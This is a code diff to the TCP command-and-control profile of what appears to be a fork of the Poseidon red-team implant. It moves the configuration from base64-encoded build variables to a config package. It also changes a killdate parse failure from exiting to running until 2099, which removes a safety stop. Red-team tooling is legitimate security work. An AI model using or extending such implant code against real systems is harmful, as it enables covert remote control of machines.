@@ -14,6 +14,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/config"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/responses"
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils"
 
@@ -24,38 +25,7 @@ import (
 	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/structs"
 )
 
-// All variables must be a string so they can be set with ldflags
-var tcp_initial_config string
 var poseidonChunkSize = uint32(30000)
-
-type TCPInitialConfig struct {
-	Port                   uint
-	Killdate               string
-	EncryptedExchangeCheck bool
-	AESPSK                 string
-}
-
-func (e *TCPInitialConfig) UnmarshalJSON(data []byte) error {
-	alias := map[string]interface{}{}
-	err := json.Unmarshal(data, &alias)
-	if err != nil {
-		return err
-	}
-	if v, ok := alias["port"]; ok {
-		e.Port = uint(v.(float64))
-	}
-	if v, ok := alias["killdate"]; ok {
-		e.Killdate = v.(string)
-	}
-	if v, ok := alias["encrypted_exchange_check"]; ok {
-		e.EncryptedExchangeCheck = v.(bool)
-	}
-	if v, ok := alias["AESPSK"]; ok {
-		e.AESPSK = v.(string)
-	}
-
-	return nil
-}
 
 type C2PoseidonTCP struct {
 	ExchangingKeys       bool
@@ -84,26 +54,17 @@ func (e C2PoseidonTCP) MarshalJSON() ([]byte, error) {
 }
 
 func init() {
-	initialConfigBytes, err := base64.StdEncoding.DecodeString(tcp_initial_config)
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("error trying to decode initial poseidon tcp config, exiting: %v\n", err))
-		os.Exit(1)
-	}
-	initialConfig := TCPInitialConfig{}
-	err = json.Unmarshal(initialConfigBytes, &initialConfig)
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial poseidon tcp config, exiting: %v\n", err))
-		os.Exit(1)
-	}
-	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
+	killDateString := fmt.Sprintf("%sT00:00:00.000Z", config.TCPKilldate)
 	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
 	if err != nil {
-		os.Exit(1)
+		utils.PrintDebug(fmt.Sprintf("error parsing killdate, using far future: %v\n", err))
+		killDateTime = time.Date(2099, 12, 31, 0, 0, 0, 0, time.UTC)
 	}
+
 	profile := C2PoseidonTCP{
-		Key:                  initialConfig.AESPSK,
-		Port:                 fmt.Sprintf("%d", initialConfig.Port),
-		ExchangingKeys:       initialConfig.EncryptedExchangeCheck,
+		Key:                  config.TCPAesPsk,
+		Port:                 fmt.Sprintf("%d", config.TCPPort),
+		ExchangingKeys:       config.TCPEncryptedExchange,
 		EgressTCPConnections: make(map[string]net.Conn),
 		FinishedStaging:      false,
 		Killdate:             killDateTime,
@@ -113,7 +74,7 @@ func init() {
 		stopListeningChannel: make(chan bool, 1),
 		chunkSize:            poseidonChunkSize,
 	}
-	// these two functions only need to happen once, not each time the profile is started
+
 	go profile.CreateMessagesForEgressConnections()
 	go profile.CheckForKillDate()
 	RegisterAvailableC2Profile(&profile)
